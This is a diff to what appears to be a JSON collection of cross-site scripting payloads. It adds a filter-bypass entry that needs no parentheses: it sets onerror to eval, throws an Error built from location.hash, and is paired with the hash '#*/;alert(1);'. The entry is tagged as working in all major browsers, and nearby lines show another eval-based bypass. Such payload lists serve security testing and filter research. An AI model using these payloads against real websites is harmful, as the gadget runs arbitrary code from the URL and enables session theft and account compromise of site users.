@@ -63,6 +63,17 @@
         ]
     },
     {
+        "description": "No parentheses using exception handling and location hash eval on all browsers",
+        "code": "<script>throw onerror=Uncaught=eval,e=new Error,e.message='\/*'+location.hash,!!window.InstallTrigger?e:e.message<\/script>",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ],
+        "hash": "#*/;alert(1);"
+    },
+    {
         "description": "No parentheses using ES6 hasInstance and instanceof with eval",
         "code": "<script>'alert\\x281\\x29'instanceof{[Symbol.hasInstance]:eval}<\/script>",
         "browsers": [
